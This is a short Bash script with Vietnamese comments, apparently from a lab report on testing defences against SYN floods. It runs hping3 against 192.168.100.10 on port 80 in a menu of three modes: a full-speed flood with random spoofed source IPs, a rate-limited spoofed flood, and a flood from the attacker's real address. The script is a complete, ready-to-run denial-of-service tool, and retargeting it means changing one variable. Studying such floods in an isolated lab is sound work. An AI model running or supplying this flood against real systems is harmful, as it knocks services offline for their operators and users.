#!/bin/bash
# ==============================================================================
# FR2 - THỰC THI KIỂM THỬ SYN FLOOD VỚI HPING3 (MULTI-IP SPOOFING)
# Chạy trên: attacker_node (192.168.100.20)
# ==============================================================================
# Lệnh chuẩn theo mục Giai đoạn 2 trong Báo cáo:
# hping3 -S --flood -V -p 80 --rand-source 192.168.100.10
# Cờ lệnh:
#   -S            : Bật duy nhất cờ SYN trong tiêu đề TCP (SYN=1, ACK=0)
#   --flood       : Gửi gói tin ở tốc độ tối đa không chờ phản hồi
#   -V            : Chế độ hiển thị chi tiết (Verbose)
#   -p 80         : Nhắm vào cổng dịch vụ HTTP Web của máy chủ
#   --rand-source : Ngẫu nhiên hóa địa chỉ IP nguồn (IP Spoofing)
# ==============================================================================

TARGET_IP="192.168.100.10"
TARGET_PORT="80"

echo "=============================================================================="
echo " [!] CHỌN CHẾ ĐỘ PHÁT TÁN GÓI TIN SYN (HPING3)"
echo " Mục tiêu: $TARGET_IP:$TARGET_PORT"
echo "=============================================================================="
echo " 1) Chế độ Tốc độ tối đa + Giả mạo IP ngẫu nhiên (--flood --rand-source) [CHUẨN BÁO CÁO]"
echo " 2) Chế độ Kiểm soát tốc độ (500 gói/s + Giả mạo IP ngẫu nhiên)"
echo " 3) Chế độ Địa chỉ IP thực của Attacker (192.168.100.20)"
echo "=============================================================================="
read -p "Nhập lựa chọn [1-3] (Mặc định: 1): " choice
choice=${choice:-1}

case $choice in
    1)
        echo "[!] BẮT ĐẦU: hping3 -S --flood -V -p $TARGET_PORT --rand-source $TARGET_IP"
        echo "[*] Nhấn Ctrl+C để dừng."
        hping3 -S --flood -V -p $TARGET_PORT --rand-source $TARGET_IP
        ;;
    2)
        echo "[*] BẮT ĐẦU: hping3 tốc độ 500 gói/giây kèm --rand-source..."
        hping3 -S -V -p $TARGET_PORT --rand-source -i u2000 $TARGET_IP
        ;;
    3)
        echo "[*] BẮT ĐẦU: hping3 sử dụng IP thực 192.168.100.20..."
        hping3 -S -V -p $TARGET_PORT -i u5000 $TARGET_IP
        ;;
    *)
        echo "[-] Lựa chọn không hợp lệ."
        exit 1
        ;;
esac
